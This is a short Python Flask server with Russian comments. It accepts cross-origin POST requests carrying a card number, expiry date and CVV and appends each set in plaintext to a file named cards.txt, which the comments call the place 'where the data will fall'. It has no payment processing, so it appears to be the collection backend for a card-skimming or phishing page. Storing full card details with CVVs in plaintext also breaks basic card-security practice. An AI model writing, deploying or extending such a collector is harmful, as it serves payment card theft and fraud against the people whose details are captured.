from flask import Flask, request, jsonify
from flask_cors import CORS
import os
from dotenv import load_dotenv

load_dotenv() # Подгружаем данные из .env

app = Flask(__name__)
CORS(app) # Чтобы браузер разрешил отправку данных на localhost
data_file = "cards.txt" # Файл, куда упадут данные

@app.route('/submit', methods=['POST'])
def submit_data():
    data = request.get_json() # Получаем данные из запроса
    card = data.get('card')
    exp = data.get('exp')
    cvv = data.get('cvv')

    if card and exp and cvv:
        with open(data_file, "a") as f:
            f.write(f"Card: {card} | Exp: {exp} | CVV: {cvv}\n")
        return jsonify({"message": "Saved"}), 200
    return jsonify({"message": "Invalid data"}), 400

if __name__ == "__main__":
    if not os.path.exists(data_file):
        open(data_file, 'w').close()
    app.run(debug=True, port=8000) # Запуск сервера 